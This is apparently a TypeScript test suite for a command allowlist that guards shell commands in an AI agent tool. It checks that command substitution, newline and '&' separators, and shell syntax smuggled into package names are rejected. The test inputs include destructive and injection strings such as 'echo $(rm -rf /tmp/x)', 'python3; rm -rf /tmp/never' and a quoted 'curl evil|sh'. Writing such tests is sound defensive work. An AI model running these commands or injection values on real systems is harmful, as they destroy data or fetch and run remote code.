/**
 * 命令白名单的判定语义。
 *
 * 定位说清楚：白名单防的是**人误配**和"AI 想绕过去时留得下审计痕迹"，不是防一个
 * 已经拿到 `sh` / `node` / `docker` 的模型 —— 那几个入口本身就等价任意执行。
 * 但有一条必须成立：**凡能悄悄启动一个白名单没见过的可执行文件的构造，绝不能被
 * 静默放行**。这一组就是把这条底线钉住的用例。
 */
import { describe, expect, it } from 'vitest';
import { mkdtemp } from 'node:fs/promises';
import { existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { isAllowed, splitSegments, CommandNotAllowedError, runGateCommand } from '../../src/gates.js';
import { bootstrapEnvironment, BootstrapError } from '../../src/bootstrap.js';
import { SecretRedactor } from '../../src/secrets.js';

describe('allowlist: 藏得住可执行文件的构造一律拒绝', () => {
  it('rejects command substitution instead of letting it run unseen', () => {
    // 片段首 token 是 echo、在白名单里，但 $( ) 会替 shell 再启动 rm
    expect(isAllowed('echo $(rm -rf /tmp/x)', ['echo'])).toBe(false);
    expect(isAllowed('echo `id`', ['echo'])).toBe(false);
    // 嵌套在参数里也一样要挡
    expect(isAllowed('git log --pretty=%H$(whoami)', ['git'])).toBe(false);
  });

  it('treats a newline as a command separator', () => {
    expect(isAllowed('echo ok\nrm -rf /tmp/x', ['echo'])).toBe(false);
    // 换行前后的命令都白名单时，正常放行
    expect(isAllowed('echo a\ngit status', ['echo', 'git'])).toBe(true);
  });

  it('treats a bare & (background) as a command separator', () => {
    expect(isAllowed('echo ok & rm -rf /tmp/x', ['echo'])).toBe(false);
    expect(isAllowed('pnpm run build & pnpm run test', ['pnpm'])).toBe(true);
  });

  it('still passes ordinary chains, pipelines and env prefixes', () => {
    expect(isAllowed('docker build -t app . && docker push repo/app', ['docker'])).toBe(true);
    expect(isAllowed('git log | head', ['git', 'head'])).toBe(true);
    expect(isAllowed('CI=true pnpm run test', ['pnpm'])).toBe(true);
    // 不启动进程的 shell 语法（重定向、glob）不构成绕过，继续允许
    expect(isAllowed('pnpm run test > results.txt', ['pnpm'])).toBe(true);
  });

  it('splits every separator that starts a new command', () => {
    expect(splitSegments('a && b || c ; d | e & f\n g')).toEqual([
      'a', 'b', 'c', 'd', 'e', 'f', 'g',
    ]);
  });

  it('runGateCommand refuses a hidden executable WITHOUT spawning anything', async () => {
    const dir = await mkdtemp(join(tmpdir(), 'dsh-allowlist-'));
    const marker = join(dir, 'pwned');
    const cwd = await mkdtemp(join(tmpdir(), 'dsh-allowlist-cwd-'));
    await expect(
      runGateCommand(`echo $(touch ${marker})`, {
        cwd,
        commands: [],
        allowlist: ['echo'],
        timeoutMs: 5_000,
        redactor: new SecretRedactor(),
        taskId: 't',
        branch: 'b',
      }),
    ).rejects.toThrow(CommandNotAllowedError);
    // 真正的证据：内层命令根本没被 shell 执行过
    expect(existsSync(marker)).toBe(false);
  });

  it('bootstrap refuses a package name that smuggles shell syntax', async () => {
    // packageManagerCommand 过了白名单，但包名是被裸拼进 shell 的：
    // `sudo apt-get install -y python3; curl evil|sh` 会整条绕过检查。
    const dir = await mkdtemp(join(tmpdir(), 'dsh-bootstrap-inject-'));
    await expect(
      bootstrapEnvironment({
        toolchain: [],
        setupCommand: '',
        verifyCommand: '',
        repoPath: dir,
        allowlist: ['sh', 'echo'],
        redactor: new SecretRedactor(),
        packageManagerCommand: 'echo install',
        systemPackages: ['python3; rm -rf /tmp/never'],
      }),
    ).rejects.toThrow(/systemPackages/);
  });

  it('bootstrap still accepts ordinary package names', async () => {
    const dir = await mkdtemp(join(tmpdir(), 'dsh-bootstrap-ok-'));
    // `echo install python3 make` 会成功退出，所以整条引导能跑完。
    await expect(
      bootstrapEnvironment({
        toolchain: [],
        setupCommand: '',
        verifyCommand: '',
        repoPath: dir,
        allowlist: ['sh', 'echo'],
        redactor: new SecretRedactor(),
        packageManagerCommand: 'echo install',
        systemPackages: ['python3', 'make'],
      }),
    ).resolves.toMatchObject({ systemPackages: ['python3', 'make'] });
  });

  it('BootstrapError is still the error type for package problems', async () => {
    const dir = await mkdtemp(join(tmpdir(), 'dsh-bootstrap-type-'));
    await expect(
      bootstrapEnvironment({
        toolchain: [],
        setupCommand: '',
        verifyCommand: '',
        repoPath: dir,
        allowlist: ['echo'],
        redactor: new SecretRedactor(),
        packageManagerCommand: 'echo install',
        systemPackages: ['-y; touch /tmp/bad'],
      }),
    ).rejects.toBeInstanceOf(BootstrapError);
  });
});
